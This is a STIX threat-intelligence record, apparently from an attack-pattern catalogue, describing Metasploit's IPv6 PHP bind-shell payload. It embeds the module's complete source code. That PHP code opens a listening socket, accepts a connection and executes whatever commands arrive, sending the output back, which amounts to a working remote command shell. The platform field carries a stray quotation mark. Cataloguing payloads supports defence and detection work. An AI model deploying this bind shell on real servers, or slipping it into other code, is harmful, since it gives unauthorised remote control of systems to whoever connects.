{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f608ca80-91d4-488e-8e5e-6695e2a3d014",
    "created": "2024-08-14T16:33:19.288021Z",
    "modified": "2024-08-14T16:33:19.288024Z",
    "name": "PHP Command Shell, Bind TCP (via php) IPv6",
    "description": "Listen for a connection and spawn a command shell via php (IPv6)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/php/bind_php_ipv6.rb",
            "external_id": "bind_php_ipv6.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::Single\n  include Msf::Payload::Php\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'PHP Command Shell, Bind TCP (via php) IPv6',\n      'Description'   => 'Listen for a connection and spawn a command shell via php (IPv6)',\n      'Author'        => ['egypt', 'diaul <diaul[at]devilopers.org>',],\n      'License'       => BSD_LICENSE,\n      'Platform'      => 'php',\n      'Arch'          => ARCH_PHP,\n      'Handler'       => Msf::Handler::BindTcp,\n      'Session'       => Msf::Sessions::CommandShell,\n      'PayloadType'   => 'cmd',\n      'Payload'       =>\n        {\n          'Offsets' => { },\n          'Payload' => ''\n        }\n      ))\n  end\n\n  #\n  # PHP Bind Shell\n  #\n  def php_bind_shell\n\n    dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4);\n    shell = <<-END_OF_PHP_CODE\n    #{php_preamble({:disabled_varname => dis})}\n    $port=#{datastore['LPORT']};\n\n    $scl='socket_create_listen';\n    if(is_callable($scl)&&!in_array($scl,#{dis})){\n      $sock=@$scl($port);\n    }else{\n      $sock=@socket_create(AF_INET6,SOCK_STREAM,SOL_TCP);\n      $ret=@socket_bind($sock,0,$port);\n      $ret=@socket_listen($sock,5);\n    }\n    $msgsock=@socket_accept($sock);\n    @socket_close($sock);\n\n    while(FALSE!==@socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL))\n    {\n      $o = '';\n      $c=@socket_read($msgsock,2048,PHP_NORMAL_READ);\n      if(FALSE===$c){break;}\n      if(substr($c,0,3) == 'cd '){\n        chdir(substr($c,3,-1));\n      } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {\n        break;\n      }else{\n        #{php_system_block({:cmd_varname=>\"$c\", :output_varname=>\"$o\", :disabled_varname => dis})}\n      }\n      @socket_write($msgsock,$o,strlen($o));\n    }\n    @socket_close($msgsock);\n    END_OF_PHP_CODE\n\n    return shell\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    return super + php_bind_shell\n  end\nend\n",
    "x_mitre_platforms": [
        "php'"
    ]
}